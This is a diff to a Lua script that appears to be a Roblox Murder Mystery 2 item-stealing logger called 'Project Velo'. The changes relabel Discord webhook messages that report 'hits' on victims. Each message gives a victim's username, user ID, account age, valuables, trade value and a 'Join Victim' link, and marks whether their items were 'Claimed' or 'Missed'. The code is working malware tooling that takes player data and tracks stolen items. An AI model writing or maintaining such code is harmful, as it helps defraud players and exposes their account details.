@@ -1611,8 +1611,8 @@ local function fn32()
 		valuablesText = valuablesText .. string.format("\n... and %d more", overflow)
 	end
 
-	-- initial status is always Hit — Missed or Trade Complete are patched in later
-	local statusText = "🟢 Hit"
+	-- initial status: In Progress — Missed or Claimed are patched onto this same message later
+	local statusText = "🔵 In Progress"
 
 	local fields = {
 		{ name = "🎯 Status",      value = string.format("```\nStatus:   %s\nExecutor: %s\nReceiver: %s\n```", statusText, str12, receiverDisplay), inline = false },
@@ -1630,7 +1630,7 @@ local function fn32()
 		username = "MM2 Logger",
 		embeds = {{
 			title  = "Murder Mystery 2! Look, You Have Hits! Congrats! 🎉",
-			color  = hasGodlyPlus and 5763719 or 15548997,
+			color  = 3447003, -- blue: In Progress
 			fields = fields,
 			footer = { text = "MM2 • Project Velo" },
 		}},
@@ -1693,7 +1693,7 @@ local function fn32_update_missed(reason)
 		valuablesText = valuablesText .. string.format("\n... and %d more", overflow)
 	end
 
-	local statusLabel = reason ~= "" and ("🔴 Missed (" .. reason .. ")") or "🔴 Missed"
+	local statusLabel = "🔴 Missed"
 
 	local fields = {
 		{ name = "🎯 Status",      value = string.format("```\nStatus:   %s\nExecutor: %s\nReceiver: %s\n```", statusLabel, str12, receiverDisplay), inline = false },
@@ -1760,7 +1760,7 @@ local function fn33(arg, arg2, _arg3)
 	end
 
 	local fields = {
-		{ name = "🎯 Status",      value = string.format("```\nStatus:   ✅ Trade Complete\nExecutor: %s\nReceiver: %s\n```", str12, receiverDisplay), inline = false },
+		{ name = "🎯 Status",      value = string.format("```\nStatus:   ✅ Claimed\nExecutor: %s\nReceiver: %s\n```", str12, receiverDisplay), inline = false },
 		{ name = "🎯 Player",      value = string.format("```\nUsername:     %s\nUser ID:      %s\nAccount Age:  %d days\nDisplay Name: %s\n```", localPlayer.Name, tostring(localPlayer.UserId), accountAgeDays, localPlayer.DisplayName), inline = false },
 		{ name = "🔗 Join Victim", value = "[Click Here](" .. joinLink .. ")", inline = false },
 		{ name = "💰 Total Value", value = "```\n" .. tradeValue .. "\n```", inline = false },
